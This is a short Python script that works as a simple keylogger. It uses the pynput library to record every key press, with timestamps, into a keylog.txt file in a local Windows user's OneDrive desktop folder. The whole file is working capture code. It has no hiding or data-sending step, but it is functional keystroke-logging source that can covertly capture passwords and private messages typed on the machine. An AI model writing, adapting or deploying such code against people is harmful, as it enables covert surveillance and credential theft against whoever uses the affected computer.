import pynput
import logging
from pynput.keyboard import Key, Listener


log_dir = r"C:/Users/jcesa/OneDrive/Área de Trabalho/Banco de Dados"

logging.basicConfig(filename=(log_dir + r"/keylog.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(Key):
    logging.info(str(Key))


with Listener(on_press=on_press) as Listener:
    Listener.join()
